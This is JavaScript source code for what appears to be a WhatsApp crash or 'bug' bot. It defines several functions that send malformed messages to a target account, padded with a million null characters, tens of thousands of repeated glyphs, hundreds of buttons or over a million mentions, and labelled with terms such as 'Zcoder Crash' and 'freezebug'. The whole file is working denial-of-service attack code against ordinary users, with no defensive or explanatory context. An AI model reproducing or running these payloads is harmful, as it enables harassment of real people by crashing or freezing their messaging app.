
async function newgalaxy(target) {
    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hai?",
                        format: "EXTENSIONS_1"
                    },
                    nativeFlowResponseMessage: {
                        name: 'galaxy_message',
                        paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target } });
}

async function newcall(target) {
    let virtex = "Anggazyy ZcoderX 🔐";
    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : 'Anggazyy ZcoderX  MODS WHATSAPP', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall2(target) {
    let virtex = "Anggazyy ZcoderX 🔐" + "𑜦".repeat(40000);

    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall3(target) {
    let virtex = "Anggazyy ZcoderX 🔐";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => target);
    
    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `-> Anggazyy ZcoderX `,
                body: `—??`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://anggazyymods.com",
                mediaUrl: "https://anggazyymods.com"
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall4(target) {
    let virtex = "Anggazyy ZcoderX 🔐";
    await anggazyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"Anggazyy ZcoderX Anggazyy ZcoderX 🔐  ◄${"᬴".repeat(60000)}","sections":[{"title":"# Anggazyy ZcoderX Anggazyy ZcoderX 🔐","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"Anggazyy ZcoderX\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}`
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ],
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # Anggazyy ZcoderX \",\"body\":\"Zcoder Crash\"}"
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newvirpen(target) {
    let virtex = "Anggazyy ZcoderX" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "Anggazyy ZcoderX Anggazyy ZcoderX 🔐"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await anggazyy.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}

async function newfreezebug(target) {
    let virtex = "Anggazyy ZcoderX 🔐";

    await anggazyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Anggazyy ZcoderX" + "@zcoder9".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Anggazyy ZcoderX " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newbuggrup(target) {
    let bugquoted = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
        },
        message: {
            documentMessage: {
                contactVcard: true
            }
        }
    };

    await anggazyy.sendMessage(target, { text: "Anggazyy ZcoderX Anggazyy ZcoderX 🔐" }, { quoted: bugquoted });
}
